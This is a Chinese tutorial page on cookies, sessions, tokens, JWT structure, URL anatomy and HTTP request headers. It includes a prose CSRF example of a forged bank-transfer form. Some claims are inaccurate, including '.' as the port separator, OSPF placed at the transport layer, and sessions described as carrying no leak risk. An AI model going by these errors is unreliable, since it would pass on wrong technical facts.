<h5 id="1-3-3-Cookie和Session的区别"><a href="#1-3-3-Cookie和Session的区别" class="headerlink" title="1.3.3 Cookie和Session的区别"></a>1.3.3 Cookie和Session的区别</h5><ol>
<li><strong>存储位置不同</strong></li>
</ol>
<p>通常情况</p>
<ul>
<li>Cookie 的数据信息存放在客户端浏览器上。</li>
<li>Session 的数据信息存放在服务器内存中。</li>
</ul>
<ol start="2">
<li><strong>存储容量不同</strong></li>
</ol>
<p>通常情况</p>
<ul>
<li>单个 Cookie 保存的数据<code>≤ 4KB</code>，一个站点最多保存<code>20</code>个 Cookie。</li>
<li>对于 Session 并没有上限，但出于对服务器端的性能考虑，Session 内不要存放过多的东西，并且设置 Session 删除机制。</li>
</ul>
<ol start="3">
<li><strong>存取方式的不同</strong></li>
</ol>
<ul>
<li>Cookie 中只能保管<code>ASCII</code>字符串，需要通过编码的方式存取<code>Unicode</code>字符或者二进制数据。运用 Cookie 难以实现存储略微复杂的信息。</li>
<li>Session中能够存取任何类型的数据，包括且不限于Sting、Integer、List、Map等。</li>
</ul>
<ol start="4">
<li><strong>隐私策略的不同</strong></li>
</ol>
<ul>
<li>Cookie 对客户端是可见的，别有用心的人可以分析存放在本地的 Cookie 并进行Cookie欺骗，所以它是不安全的。</li>
<li>Session 存储在服务器上，对客户端是透明的，不存在敏感信息泄露的风险。</li>
</ul>
<p>假如选用 Cookie，比较好的方法是：敏感的的信息，如账号密码等，尽量不要写到 Cookie中。可以将 Cookie 信息加密，提交到服多务器后再进行解密。存储在本地的 Cookie 就需要自行加密。</p>
<ol start="5">
<li><strong>有效期上的不同</strong></li>
</ol>
<ul>
<li>开发可以通过设置 Cookie的属性，达到使Cookie长期有效的效果。</li>
<li>由于Session依赖于名为<code>JSESSIONID</code>的 Cookie，而<code>Cookie JSESSIONID</code>的过期时间默认为<code>-1</code>，只需关闭窗口该 Session 就会失效。因而 Session 不能达到长期有效的效果，就算不依顿于 Cookie，运用 URL 地址重写也不能完成，因为假如设置 Session 的超时时间过长，服务器累计的 Session 就会越多，越容易导致内存溢出。</li>
</ul>
<ol start="6">
<li><strong>服务器压力的不同</strong></li>
</ol>
<ul>
<li>Session 是保管在服务器端内存中的，每个用户都会产生一个 Session。假如并发访问的用户很多，会产生很多的 Session，耗费大量的内存。</li>
<li>Cookie 保管在客户端，不占用服务器资源。对于并发用户很多的网站，Cookie 是很好的选择。</li>
</ul>
<ol start="7">
<li><strong>浏览器支持的不同</strong></li>
</ol>
<p>假如客户端浏览器不支持 Cookie。</p>
<ul>
<li>Cookie 是需要客户端浏览器支持的。假如客户端禁用了 Cookie， 或者不支持 Cookie，则会话跟踪会失效。关于 WAP 上的应用，常规的 Cookie 就派不上用场了。</li>
<li>运用 Session 需要使用URL地址重写的方式。一切用到 Session 程序的 URL 都要进行 URL 地址重写，否则Session 会话跟踪还会失效。关于 WAP 应用来说，Session+URL 地址重写或许是它唯一的选择。</li>
</ul>
<p>假如客户端支持Cookie。</p>
<ul>
<li>Cookie既能够设为本浏览器窗口以及子窗口内有效（把过期时间设为<code>-1</code>），也能够设为一切窗口内有效（把过期时间设为某个大于0的整数）。</li>
<li>Session 只能在本窗口以及其子窗口内有效。假如两个浏览器窗口互不相干，它们将运用两个不同的 Session（IE8 下不同窗口 Session 相干。）</li>
</ul>
<ol start="8">
<li><strong>跨域支持上的不同</strong></li>
</ol>
<ul>
<li>Cookie支持跨城名访问，例如，将<code>domain</code>属性设置为<code>.biaodianfu.com</code>，则以 <code>.biaodianfu.com</code>为后缀的一切域名均能够访问该 Cookie。跨域名 Cookie 如今被普遍用在网络中，例如，Google、Baidu、Sina 等。</li>
<li>Session 则不会支持跨坡名访问。Session 仅在它所在的城名内有效。</li>
</ul>
<h4 id="1-4-Token"><a href="#1-4-Token" class="headerlink" title="1.4 Token"></a>1.4 Token</h4><ul>
<li>Session 是用来解决 Cookie 的安全性的问题的，那么 Token 就是用来解决 Session 消耗内存问题而提升性能的。</li>
<li>Token 是使用时间换取空间的方法，即 CPU 计算验证的时间换取内存存储 Session 的空间。</li>
<li>Token 受同源策略限制，而 Cookie 和 Session 不受同源策略限制，故 Token 能够防范 CSRF 攻击。</li>
</ul>
<p><img data-src="https://i.loli.net/2020/11/03/MGPEQZzJ8YvUO9K.png" alt="未命名文件.png"></p>
<div class="note warning"><p>Token 的原理图如上图，可以概述为以下几点：</p>
<p>（1）客户端第一次请求时，发送用户信息到服务器。服务器收到用户信息并进行身份认证无误后，使用加密算法和密钥对用户信息进行签名，然后将被签名和数据作为 Token，返回给客户端。</p>
<p>（2）<strong>服务器端不保存 Token，客户端保存 Token</strong>。</p>
<p>（3）客户端再次发送请求时，在请求的信息中将 Token 一起发送给服务器。</p>
<p>（4）服务器使用同样的加密算法和密钥对数据再进行一次签名，然后对比计算得到的签名和 Token 的签名做比较进行认证。</p>
</div>

<p>运用 Token 服务器就不再需要保存 Session 了，只需要生成 Token 然后认证 Token，这就是服务器利用 CPU 计算时间换取 Session存储空间的方式。Token 可以放在 Cookie 中，若客户端不支持 Cookie，Token 也可以放置在请求头中。</p>
<p>Token 通常用于一种轻巧的规范下，这种规范叫做 JOSN Web Token（<mark class="label success">JWT</mark>）。</p>
<div class="note success"><p><strong>Token可以抵抗CSRF，Cookie + Session不行？</strong></p>
<p>假如用户正在登陆银行网页，同时登陆了攻击者的网页，并且银行网页未对csrf攻击进行防护。攻击者就可以在网页放一个表单，该表单提交src为<code>http://www.bank.com/api/transfer</code>，body为<code>count=1000&amp;to=Tom</code>。倘若是session+cookie，用户打开网页的时候就已经转给Tom1000元了.因为form 发起的 POST 请求并不受到浏览器同源策略的限制，因此可以任意地使用其他域的 Cookie 向其他域发送 POST 请求，形成 CSRF 攻击。在post请求的瞬间，cookie会被浏览器自动添加到请求头中。但token不同，token是开发者为了防范csrf而特别设计的令牌，浏览器不会自动添加到headers里，攻击者也无法访问用户的token，所以提交的表单无法通过服务器过滤，也就无法形成攻击。</p>
</div>

<p>参考文章：</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/63061864">彻底理解cookie，session，token</a></li>
<li><a href="https://www.cnblogs.com/xuxinstyle/p/9675541.html">深入理解token</a></li>
<li><a href="https://www.cnblogs.com/lufeiludaima/p/pz20190203.html">什么是token及怎样生成token</a></li>
<li><a href="https://segmentfault.com/a/1190000017831088">彻底弄懂session，cookie，token</a></li>
</ul>
<h4 id="1-5-JOSN-Web-Token（JWT）"><a href="#1-5-JOSN-Web-Token（JWT）" class="headerlink" title="1.5 JOSN Web Token（JWT）"></a>1.5 JOSN Web Token（JWT）</h4><p>JOSN Web Token（JWT）是一种开放标准（ RFC 7519），它定义了一种紧凑且安全的标准，用于将各方之间的信息传输为 JSON 对象。该信息通过数字简明进行校验。使用 HMAC 算法或者使用 RSA 的公钥&#x2F;私钥对 JWT 进行检签名，但是在通信中为了提高通信的速度，所以一般使用对称密码算法进行数字签名。</p>
<p>JWT 由三部分组成：<mark class="label info">头部</mark>、<mark class="label warning">荷载</mark> 与 <mark class="label success">签名</mark>。</p>
<h5 id="1-5-1-头部-Header"><a href="#1-5-1-头部-Header" class="headerlink" title="1.5.1 头部( Header )"></a>1.5.1 头部( Header )</h5><p>头部用于描述关于 JWT 的最基本的信息，例如，其类型以及签名所用的算法等。它被表示成一个 JSON 对象。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line"><span class="attr">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里，我们说明了这是一个<code>JWT</code>，并且我们所用的签名算法是<code>HS256</code>算法。</p>
<p>对它进行<mark class="label danger">Base64编码后</mark>形成的字符串就成了<code>JWT</code>的<code>header</code> (头部)。</p>
<h5 id="1-5-2-载荷-Payload"><a href="#1-5-2-载荷-Payload" class="headerlink" title="1.5.2 载荷( Payload )"></a>1.5.2 载荷( Payload )</h5><p>将添加好友的操作描述成一个<code>JSON</code>对象。其中添加了一些其他的信息，帮助今后收到这个<code>JWT</code>的服务器理解这个<code>JWT</code>。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;iss&quot;</span>: <span class="string">&quot;Kathy Yang JWT&quot;</span>, </span><br><span class="line"><span class="attr">&quot;iat&quot;</span>: <span class="number">1455624102</span>,</span><br><span class="line"><span class="attr">&quot;exp&quot;</span>: <span class="number">1475632522</span>,</span><br><span class="line"><span class="attr">&quot;aud&quot;</span>: <span class="string">&quot;www.example.com&quot;</span>,</span><br><span class="line"><span class="attr">&quot;sub&quot;</span>: <span class="string">&quot;jrocket@example.com&quot;</span>,</span><br><span class="line"><span class="attr">&quot;Givename&quot;</span>: <span class="string">&quot;Smark&quot;</span>,</span><br><span class="line"><span class="attr">&quot;Surname&quot;</span>: <span class="string">&quot;Kathy&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里面的前五个字段都是由<code>JWT</code>的标准所定义的。</p>
<ul>
<li><code>iss</code>：该<code>JWT</code>的签发者。</li>
<li><code>sub</code>：该<code>JWT</code>所面向的用户。</li>
<li><code>aud</code>：接收该<code>JWT</code>的一方。</li>
<li><code>exp</code>(<code>expires</code>)：什么时候过期，这里是一个<code>UNIX</code>时间戳。</li>
<li><code>iat</code>(<code>issued at</code>)：在什么时候签发的。</li>
</ul>
<p>将上面的<code>JSON</code>对象进行<mark class="label danger">Base64编码后</mark>可以得到一串字符串。这个字符串我们将它称作<code>JWT</code>的<code>Payload</code> (载荷)。</p>
<h5 id="1-5-3-签名-Signature"><a href="#1-5-3-签名-Signature" class="headerlink" title="1.5.3 签名( Signature )"></a>1.5.3 签名( Signature )</h5><p>将上面的两个编码后的字符串都用符号 <code>.</code> 连接在一起 （头部在前），就形成了一串新的字符串。最后，我们将上面拼接完的字符串用<code>HS256</code>算法进行加密。在加密的时候，我们还需要提供一个密钥（<code>secret</code>）。通过密钥和加密算法加密后的部分就叫作签名。</p>
<p>总结 <code>JWT</code> 生成过程为：</p>
<div class="note primary"><ol>
<li>头部<code>JSON</code>对象 --&gt; <code>Base64</code>  --&gt; <code>JWT</code>的头部<code>Head</code></li>
<li>荷载<code>JSON</code>对象 --&gt; <code>Base64</code>  --&gt; <code>JWT</code>的荷载<code>Payload</code></li>
<li><code>JWTHead.JWTPayload</code>  --&gt;  <code>HS256</code>加密   --&gt; <code>JWT</code>的签名<code>Signature</code></li>
<li><code>JWT</code>的完整格式：<mark class="label success">Head</mark><mark class="label danger">.</mark><mark class="label success">Payload</mark><mark class="label danger">.</mark><mark class="label success">Signature</mark></li>
</ol>
</div>



<p>下面通过一个实例了解<code>JWT</code>机制实现认证的过程。当用户第一次登录系统时，如图4.17所示。</p>
<p>创建<code>JWT</code>的步骤如下。</p>
<p>(1)第一次登录，用户从客户端输人用户名&#x2F;密码，提交后到服务器的登录处理<code>Action</code>层 （ <code>Login Action</code>）。</p>
<p><img data-src="https://i.loli.net/2020/11/04/m1GFIQfnhrzsACE.png" alt="Login Action.png"></p>
<p><img data-src="https://i.loli.net/2020/11/04/PjdGCvabwDmqFxn.png" alt="第4章 接口测试的基础 2.png"></p>
<p><img data-src="https://i.loli.net/2020/11/04/TA2LqSRjkVfgxBe.png" alt="1598504-20190202220449263-1608141775.png"></p>
<h3 id="2-HTTP-协议"><a href="#2-HTTP-协议" class="headerlink" title="2 HTTP 协议"></a>2 HTTP 协议</h3><p>网络协议就是为计算机网络中进行数据交换而建立的规则、标准或约定的集合。</p>
<p>为了使不同计算机厂家 生产的计算机能够相互通信，以便在更大的范围内建立计算机网络，国际标准化组织（ISO）在1978 年提出了“开放系统互联参考模型”，即著名的 OSIRM 模型（Open System Itereonnection&#x2F;RefrerceModel）。它将计算机网络体系结构的通信协议划分为七层，自下而上依次为：物理层、数据链路层、网络层、传输层、会话层、表示层、应用层。</p>
<p>每一层都有其不同的含义及网络协议。</p>
<table>
<thead>
<tr>
<th align="center">网络结构层</th>
<th>协议</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>物理层</strong></td>
<td>以太网、调制解调器、电力线通信(PLC)、SONET&#x2F;SDH、光导纤维、同轴电缆、双绞线等。</td>
</tr>
<tr>
<td align="center"><strong>数据链路层</strong></td>
<td>Wi-Fi(EEE 82.11)、WiMAX(IEEE 802.16)、ATM、令牌环、PPP、L2TP、PPTP等。</td>
</tr>
<tr>
<td align="center"><strong>网络层协议</strong></td>
<td>IP(IPv4、IPv6)、ICMP、ICMPv6、IGMP、IS-IS、IPsec、 ARP、RARP等。</td>
</tr>
<tr>
<td align="center"><strong>传输层协议</strong></td>
<td>TCP、UDP、TLS、 DCCP、SCTP、 RSVP、 OSPF 等。</td>
</tr>
<tr>
<td align="center"><strong>应用层协议</strong></td>
<td>DNS、FTP、Gopher、HTTP、IMAP4、POP3、SIP、SSH、TELNET、RPC、SDP、SOAP、GTP等。</td>
</tr>
</tbody></table>
<p>本节主要讲的就是应用层中被应用最多的协议：HTTP 协议。</p>
<h4 id="2-1-HTTP-协议介绍"><a href="#2-1-HTTP-协议介绍" class="headerlink" title="2.1 HTTP 协议介绍"></a>2.1 HTTP 协议介绍</h4><p>HTTP&#x2F;1.0 没有充分考虑分层代理、缓存以及持久连接和虚拟主机的需求的影响。并且随着不完善的 HTTP&#x2F;1.0 应用程序的激增，迫切需要一个新的版本，以便使两个通信程序能够确定彼此真实的能力。此规范协议叫做<mark class="label primary">HTTP/1.1</mark>，这个协议与<mark class="label success">HTTP/1.0</mark>相比，更为严格，以确保各个协议的特征得到可靠实现。</p>
<p>把HTTP协议的官方定义进行归纳，得出HTTP协议的4个关键点。</p>
<p>（1）HTTP 是建立在 TCP&#x2F;IP 协议之上，面向应用层的超文本传输协议。</p>
<p>（2）它由请求和响应组成，完全符合标准的客户端服务器的请求响应模型。</p>
<p>（3）协议很轻便简单，并且请求与请求间没有关联，是无状态性的协议。</p>
<p>（4）为了弥补这种无状态性就需要使用 HTTP 协议的扩展 Cookie 等方式建立关联。</p>
<p>（5）HTTP 协议工作于客户端-服务器的架构上，采用请求&#x2F;响应模型。</p>
<h4 id="2-2-Uniform-Resource-Locator（URL）"><a href="#2-2-Uniform-Resource-Locator（URL）" class="headerlink" title="2.2 Uniform Resource Locator（URL）"></a>2.2 Uniform Resource Locator（URL）</h4><ul>
<li>URL：统一资源定位器&#x2F;统一资源定位系统。HTTP&#x2F;1.0支持：GET、POST、HEAD三种HTTP请求方法。</li>
<li>URI：统一资源定位标识符（Uniform Resource Identifiers），URL 是一种特殊类型的 URI，包含了用于查找某个资源的足够的信息。HTTP&#x2F;1.1是当前正在使用的版本。该版本默认采用持久连接，并能很好地配合代理服务器工作。还支持以管道方式同时发送多个请求，以便降低线路负载，提高传输速度。HTTP&#x2F;1.1 新增了：OPTIONS、PUT、DELETE、TRACE、CONNECT 五种 HTTP 请求方法。</li>
</ul>
<p>URL 的基本格式如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">schema://host[:port#]/path/.../[;url-params][?query-string][#anchor]</span><br><span class="line">&lt;方案&gt;://&lt;用户名&gt;:&lt;密码&gt;@主机:端口/路径;参数?查询#片段</span><br></pre></td></tr></table></figure>

<p>URL主要有三个作用。</p>
<p>（1）HTTP 是 URL 的方案，方案告诉客户端使用什么样的协议去访问服务器。</p>
<p>（2）<code>Host: www.example.com</code>， 指服务器的位置。</p>
<p>（3）<code>/index.html</code>是资源路径，说明了请求的是服务器上哪个特定的本地资源。</p>
<p>我们以链接<code>http://www.kath2.com/news/index.asp?ID=210&amp;page=1#name</code> 为例，对 URL 进行详解。</p>
<p>URL 一般分为以下几个部分。</p>
<ol>
<li><strong>协议部分</strong>：该 URL 的协议部分为<code>HTTP:</code>，这代表网页使用的是 HTTP 协议。在 Internet 中可以使用多种协议，如HTTPS、Ftp 等。在<code>HTTP</code>后面的<code>//</code>为分隔符。</li>
<li><strong>域名部分</strong>：该 URL 的域名部分为<code>www.kath2.com</code> 。一个 URL 中，也可以使用 IP 地址作为域名使用。</li>
<li><strong>端口部分</strong>：跟在域名后面的是端口，域名和端口之间使用 <code>.</code> 作为分隔符。端口不是一 个 URL 必需的部分，如果省略端口部分，将采用默认端口。例如，HTTP 的默认端口为<code>80</code>, HTTPS 的默认端口为<code>443</code>。</li>
<li><strong>虚拟目录部分</strong>：从域名后的第一个<code>/</code>开始到最后一个<code>/</code>为止，是虛拟目录部分。 虚拟目录也不是一个 URL必需的部分。本例中的虚拟目录是<code>/news/</code>。</li>
<li><strong>文件名部分</strong>：从域名后的最后一个<code>/</code>开始到<code>?</code>为止，是文件名部分。<ol>
<li>如果没有<code>?</code>，则是从域名后的最后一个<code>/</code>开始到<code>#</code>为止，是文件名部分。 </li>
<li>如果没有<code>?</code>和<code>#</code>，那么从域名后的最后一个<code>/</code>开始到结束，都是文件名部分。 本例中的文件名是<code>index.asp</code> 。文件名部分也不是一个 URL 必需的部分，如果省略该部分，则使用默认的文件名。</li>
</ol>
</li>
<li><strong>锚部分</strong>：从<code>#</code>开始到最后，都是锚部分。本例中的锚部分是<code>name</code> 。锚部分也不是一个 URL 必需的部分。</li>
<li><strong>参数部分</strong>：从<code>?</code>开始到<code>#</code> 为止之间的部分为参数部分，又称搜索部分、查询部分。 本例中的参数部分为<code>ID= -210&amp;page=1</code>。可以允许有多个参数，参数与参数之间用<code>&amp;</code>作为分隔符。</li>
</ol>
<h4 id="2-3-请求报文（request）"><a href="#2-3-请求报文（request）" class="headerlink" title="2.3 请求报文（request）"></a>2.3 请求报文（request）</h4><h5 id="2-3-1-报文格式"><a href="#2-3-1-报文格式" class="headerlink" title="2.3.1 报文格式"></a>2.3.1 报文格式</h5><p><img data-src="https://i.loli.net/2020/11/06/3eD81tGJxwgSfIV.png" alt="屏幕快照 2020-11-06 下午2.37.26.png"></p>
<p>request 报文的结构分为 4 部分：</p>
<ul>
<li>请求行（request line）</li>
<li>请求头部（header）</li>
<li>空行</li>
<li>主体（body）</li>
</ul>
<p>header 和 body 之间有个<mark class="label warning">空行</mark>。</p>
<p><img data-src="https://i.loli.net/2020/11/06/21ah8vLkg9Np37m.png" alt="1820506-20190928150409842-1112819644 (1).png"></p>
<h5 id="2-3-2-请求行"><a href="#2-3-2-请求行" class="headerlink" title="2.3.2 请求行"></a>2.3.2 请求行</h5><p><strong>一、请求方法</strong></p>
<p>请求行中包括请求方法（<strong>GET、POST、HEAD、PUT、DELETE、OPTIONS、TRACE、CONNECT</strong>），其中最常用的为<strong>GET、POST</strong>。</p>
<p>请求的起始行以方法作为开始，方法用来告诉服务器要如何做。</p>
<p>在开发中通常有两种请求方式。</p>
<table>
<thead>
<tr>
<th align="center">请求方式</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>GET</strong></td>
<td align="left">是以实体的方式得到由请求URI所指定资源的信息，如果请求 URI 只是一个数据产生过程，那么最终要在响应实体中返回的是处理过程的结果所指向的资源，而不是处理过程的描述。</td>
</tr>
<tr>
<td align="center"><strong>POST</strong></td>
<td align="left">用来向目的服务器发出请求，要求它接收被附在请求后的实体，并把它当作请求队列中请求 URI 所指定资源的附加新子项，所以 post 请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。</td>
</tr>
<tr>
<td align="center"><strong>HEAD</strong></td>
<td align="left">类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头。</td>
</tr>
<tr>
<td align="center"><strong>DELETE</strong></td>
<td align="left">请求服务器删除指定的页面。</td>
</tr>
<tr>
<td align="center"><strong>CONNECT</strong></td>
<td align="left">HTTP&#x2F;1.1 协议中预留给能够将连接改为管道方式的代理服务器。</td>
</tr>
<tr>
<td align="center"><strong>OPTIONS</strong></td>
<td align="left">允许客户端查看服务器的性能。</td>
</tr>
<tr>
<td align="center"><strong>TRACE</strong></td>
<td align="left">回显服务器收到的请求，主要用于测试或调试。</td>
</tr>
</tbody></table>
<p><strong>二、HTTP版本</strong></p>
<table>
<thead>
<tr>
<th align="center">协议版本</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>HTTP&#x2F;1.0</strong></td>
<td>HTTP&#x2F;1.0支持：GET、POST、HEAD三种HTTP请求方法。</td>
</tr>
<tr>
<td align="center"><strong>HTTP&#x2F;1.1</strong></td>
<td>HTTP&#x2F;1.1是当前正在使用的版本。该版本默认采用持久连接，并能很好地配合代理服务器工作。还支持以管道方式同时发送多个请求，以便降低线路负载，提高传输速度。HTTP&#x2F;1.1新增了：OPTIONS、PUT、DELETE、TRACE、CONNECT 五种 HTTP 请求方法。</td>
</tr>
</tbody></table>
<p>　</p>
<h5 id="2-3-3-请求头"><a href="#2-3-3-请求头" class="headerlink" title="2.3.3 请求头"></a>2.3.3 请求头</h5><p>请求报头域主要用于指定被请求资源的 Internet 主机和端口号，它通常从 HTTP URL 中提取出来。</p>
<p>请求报文的 header 属性为以下六个部分：</p>
<ul>
<li>Cache</li>
<li>Client</li>
<li>Cookies</li>
<li>Miscellaneou</li>
<li>Security</li>
<li>Transport</li>
</ul>
<p><strong>一、Cache</strong> 头域</p>
<table>
<thead>
<tr>
<th align="center">Cache 字段名称</th>
<th>字段值说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>Cache-Control</strong></td>
<td>用来指定Response-Request遵循的缓存机制。各个指令含义如下。<br/><strong>Cache-Control:Public</strong>：可以被任何缓存所缓存。<br/><strong>Cache-Control:Private</strong>：指示响应信息的全部或部分用于单个用户，而不能用一个共享缓存来缓存。这可以让源服务器指示，响应的特定部分只用于一个用户，而对其他用户的请求则是一个不可靠的响应。<br/><strong>Cache-Control:no-cache</strong>：所有内容都不会被缓存，请求头里的<code>no-cache</code>表示浏览器不想读 缓存，并不是说没有缓存。一般在浏览器按<code>Ctrl+F5</code>键强制刷新时，请求头里也会有这个<code>no-cache</code>，也就是跳过强缓存和协商缓存阶段，直接请求服务器。<br/><strong>Cache-Control:max-age&#x3D;0</strong>：指示客户端愿意接收其绝对时间不大于指定的时间，以秒计。 如果直接按<code>F5</code>键的话，请求头是<code>max-age =0</code>，只跳过强缓存，但进行协商缓存。</td>
</tr>
<tr>
<td align="center"><strong>if-Modified-Since</strong></td>
<td>把浏览器端缓存页面的最后修改时间发送到服务器去，服务器会把这个时间与服务器上实际文件的最后修改时间进行对比。如果时间一致，那么返回<mark class="label primary">304</mark>，客户端就直接使用本地缓存文件。如果时间不一致，就会返回<mark class="label success">200</mark>和新的文件内容。客户端接到之后，会丢弃旧文件，把新文件缓存起来，并显示在浏览器中。<br/><strong>本地文件的修改时间和服务器上的文件修改时间一致， 说明文件没有被更新。HTTP服务器返回304，告诉客户端使用本地缓存文件。</strong></td>
</tr>
<tr>
<td align="center"><strong>If-None-Match</strong></td>
<td><mark class="label warning">If-None-Match</mark>和<mark class="label info">ETag</mark>一起工作，工作原理是在<code>HTTP response</code> 中添加 ETag 信息。当用户再 次请求该资源时，将在 <code>HTTP request</code> 中加入<code>If-None-Match</code>信息( <code>ETag</code>的值)。如果服务器验证资源的<code>ETag</code>没有改变(该资源没有更新)，将返回一个<code>304</code>状态告诉客户端使用本地缓存文件，否则将返回<code>200</code>状态和新的资源和<code>Etag</code>。 使用这样的机制将提高网站的性能。<br/><code>If-None-Mach</code>和<code>ETag</code>的值一致， 说明文件没有被更新。服务器将返回<code>304</code>，告诉客户端使用本地缓存文件。<br/></td>
</tr>
<tr>
<td align="center">Pragma</td>
<td>防止页面被缓存，<code>HTTP/L.1</code>版本中， 它和<code>Cache-Coltrol:no-cache</code>的作用一模一样。 <code>Pargma</code>只有一个用法，例如，<code>Pragma: no-cache</code>。</td>
</tr>
</tbody></table>
<p><strong>二、Client头域</strong></p>
<table>
<thead>
<tr>
<th>Client字段名称</th>
<th>字段值说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Accept</strong></td>
<td>浏览器端可以接收的媒体类型。<br/><mark class="label success">Accept: text/html</mark> 代表浏览器可以接收服务器发回的类型为<code>text/html</code>也就是我们常说的<code>HTML</code>文档，如果服务器无法返回<code>text/html</code>类型的数据，服务器应该返回一个<mark class="label info">406</mark>错误（non acceptable）<br/><mark class="label success">Accept:*/*</mark> 通配符<code>*</code>代表任意类型。代表浏览器可以处理所有类型。<br/><mark class="label success">Accept -Encoding</mark>  浏览器声明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法 ( <code>gzip</code>，<code>deflate</code>) 。例如，<code>Accept-Encoding: gzip, deflate</code><br/><mark class="label success">Accept - Language</mark>   浏览器声明自己接收的语言。语言跟字符集的区别是：中文是语言，中文有多种字符集，比 如<code>bigs</code>、<code>gb2312</code>、<code>gbk</code>等。</td>
</tr>
<tr>
<td><strong>User-Agent</strong></td>
<td>告诉 HTTP 服务器客户端使用的操作系统和浏览器的名称和版本。我们上网登录论坛的时候，往往会看到一些欢迎信息，其中列出了你的操作系统的名称和版本、你所使用的浏览器的名称和版本，实际上，服务器应用程序就是从<code>User-Agent</code>这个请求报头域中获取到这些信息的。</td>
</tr>
<tr>
<td><strong>Accept-Charset</strong></td>
<td>浏览器声明自己接收的字符集，如<code>gb2312</code>、<code>utf-8</code>等。</td>
</tr>
</tbody></table>
<p><strong>三、Cookie</strong></p>
<table>
<thead>
<tr>
<th>Cookie字段名称</th>
<th>字段值说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Cookie</strong></td>
<td>最重要的 header，将Cookie 的值发送给 HTTP 服务器。</td>
</tr>
</tbody></table>
<p><strong>四、Miscellaneous 头域</strong></p>
<table>
<thead>
<tr>
<th>Miscellaneous字段名称</th>
<th>字段值说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Referer</strong></td>
<td>提供了 request 的上下文信息的服务器，告诉服务器我是从哪个链接过来的。有些统计数据需要用到此头域。比如从我的主页上链接到统计服务器那里，该服务器就能够从<code>HTTP Referer</code>中统计出每天有多少用户点击我主页上的链接访问他的网站。</td>
</tr>
</tbody></table>
<p><strong>五、Entity 头域</strong></p>
<table>
<thead>
<tr>
<th>Entity字段名称</th>
<th>字段值描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Content-Length</strong></td>
<td>发送给 HTTP 服务器数据的长度。</td>
</tr>
<tr>
<td><strong>Content-Type</strong></td>
<td>①表示具体请求中的媒体类型信息。常见的媒体格式类型如下。<br/><strong>text&#x2F;html</strong>：HTML格式<br/><strong>text&#x2F;plain</strong>：纯文本格式<br/><strong>text&#x2F;xml</strong>：XML格式<br/><strong>imag&#x2F;gif</strong>：gif图片格式<br/><strong>image&#x2F;jpeg</strong>：jpg图片格式<br/><strong>image&#x2F;png</strong>：png图片格式<br/>②以application开头的媒体格式类型如下：<br/><strong>application&#x2F;xhtml+xml</strong>：XHTML格式<br/><strong>application&#x2F;xml</strong>：XML数据格式<br/><strong>application&#x2F;atom+xml</strong>：Atom XML聚合格式<br/><strong>application&#x2F;json</strong>：JSON数据格式<br/><strong>application&#x2F;pdf</strong>：pdf格式<br/><strong>application&#x2F;msword</strong>：Word文档格式<br/><strong>application&#x2F;octet-stream</strong>：二进制流数据<br/><strong>application&#x2F;x-www-form-urlencoded</strong>： <code>&lt;form encType=&quot;&quot;&gt;</code>中默认的<code>encType</code>，<code>form</code>表单数据被编码为<code>key/value</code><br/>格式发送到服务器（表单默认的提交数据的格式）。<br/>③另外一种常见的媒体格式是上传文件之时使用的。<br/><strong>multipart&#x2F;form-data</strong>：需要在表单中进行文件上传时，就需要使用该格式。</td>
</tr>
</tbody></table>
<p><strong>六、Transport 头域</strong></p>
<table>
<thead>
<tr>
<th>Transport字段名称</th>
<th>字段值描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Connection</strong></td>
<td><strong>Connection: keep-alive</strong>：当一个网页打开完成后，客户端和服务器之间用于传输 HTTP 数据的 TCP 连接不会关闭，如果客户端再次访问这个服务器上的网页，会继续使用这一条已经建 立的连接。<br/><strong>Connection: close</strong>：代表一个 request 完成后，客户端和服务器之间用于传输 HTTP 数据的TCP 连接会关闭，当客户端再次发送 request 时，需要重新建立 TCP 连接。</td>
</tr>
<tr>
<td><strong>Host</strong></td>
<td>发送请求时，该报头域是必需的</td>
</tr>
</tbody></table>
<p>参考文章：</p>
<ul>
<li><a href="https://www.cnblogs.com/Mr-mubai/p/11603520.html">HTTP报文格式</a></li>
<li><a href="https://www.cnblogs.com/kageome/p/10859996.html">http报文详解</a></li>
<li><a href="https://blog.csdn.net/u012375924/article/details/82806617">浅谈http中的Cache-Control</a></li>
<li><a href="https://wenku.baidu.com/view/80397dda71fe910ef12df8af.html">http协议请求响应报文格式及状态码详解</a></li>
</ul>
<h4 id="2-4-响应报文（response）"><a href="#2-4-响应报文（response）" class="headerlink" title="2.4 响应报文（response）"></a>2.4 响应报文（response）</h4><h5 id="2-4-1-报文格式"><a href="#2-4-1-报文格式" class="headerlink" title="2.4.1 报文格式"></a>2.4.1 报文格式</h5><p>Response 报文的结构也分为 4 部分：</p>
<ul>
<li>响应状态（response code）</li>
<li>响应头（response header）</li>
<li>空行</li>
<li>响应主体（response body）</li>
</ul>
<p>header 和 body 之间也有一个空行。</p>
<p><img data-src="https://i.loli.net/2020/11/06/a8rIAkjD7qdzFT4.png" alt="屏幕快照 2020-11-06 下午2.40.03.png"></p>
<h5 id="2-4-2-状态行"><a href="#2-4-2-状态行" class="headerlink" title="2.4.2 状态行"></a>2.4.2 状态行</h5><p>状态行最重要的一部分就是响应报文的<mark class="label success">状态码</mark>。</p>
